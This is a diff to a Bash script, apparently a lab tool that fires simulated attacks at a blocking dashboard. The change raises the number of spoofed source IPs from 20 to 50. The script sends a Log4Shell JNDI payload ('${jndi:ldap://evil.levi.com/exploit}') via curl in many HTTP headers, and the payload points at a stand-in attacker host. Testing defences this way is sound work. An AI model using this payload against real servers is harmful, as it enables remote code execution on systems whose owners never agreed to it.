@@ -37,9 +37,9 @@ if [[ -z "$IP_BASE" ]]; then
     IP_BASE="192.168.1" # Fallback
 fi
 
-# Range IP virtual yang akan dibuat (Contoh: 170.2.50.50 - 170.2.50.69)
+# Range IP virtual yang akan dibuat (Contoh: 170.2.50.50 - 170.2.50.99)
 IP_START=50
-IP_COUNT=20
+IP_COUNT=50
 
 # Delay antar serangan (detik) — ubah ke 0 untuk serangan kilat
 DELAY=0.5
@@ -132,12 +132,13 @@ PAYLOAD="\${jndi:ldap://evil.levi.com/exploit}"
 
 echo ""
 info "Menggunakan serangan Log4Shell (CVE-2021-44228)"
-info "Payload dikirim via 20 header HTTP berbeda dari 20 IP berbeda"
+info "Payload dikirim via 20 header HTTP berbeda dari ${IP_COUNT} IP berbeda"
 echo ""
 
-for idx in "${!HEADERS[@]}"; do
-    SRC_IP="${IP_BASE}.$((IP_START + idx))"
-    HDR="${HEADERS[$idx]}"
+for i in $(seq 0 $((IP_COUNT - 1))); do
+    SRC_IP="${IP_BASE}.$((IP_START + i))"
+    HDR_IDX=$((i % ${#HEADERS[@]}))
+    HDR="${HEADERS[$HDR_IDX]}"
 
     attack "Log4Shell [${HDR}] dari ${BOLD}${SRC_IP}${NC}"
     curl -s --max-time 3 \
@@ -152,7 +153,7 @@ done
 
 # ── Ringkasan ─────────────────────────────────────────────────────────────────
 header "✅ Simulasi Selesai!"
-echo -e "  ${BOLD}20 serangan${NC} dari ${BOLD}20 IP berbeda${NC} telah diluncurkan!"
+echo -e "  ${BOLD}${IP_COUNT} serangan${NC} dari ${BOLD}${IP_COUNT} IP berbeda${NC} telah diluncurkan!"
 echo ""
 echo -e "  ${GREEN}➜${NC} Buka Dasbor: ${BOLD}http://${TARGET_IP}:${TARGET_PORT}${NC}"
 echo -e "  ${GREEN}➜${NC} Lihat IP mana yang berhasil diblokir di tabel ${BOLD}IP Diblok${NC}"
